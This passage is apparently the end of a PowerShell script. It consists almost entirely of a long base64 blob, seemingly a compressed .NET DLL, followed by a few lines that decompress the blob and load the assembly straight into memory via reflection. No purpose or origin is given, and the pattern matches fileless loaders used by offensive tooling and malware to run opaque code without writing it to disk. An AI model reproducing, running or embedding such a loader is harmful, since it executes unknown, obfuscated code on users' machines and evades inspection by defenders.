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
'@
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedDll),[IO.Compression.CompressionMode]::Decompress)
$UncompressedBytes = New-Object Byte[](25600)
$DeflatedStream.Read($UncompressedBytes, 0, 25600) | Out-Null
$null = [Reflection.Assembly]::Load($UncompressedBytes)
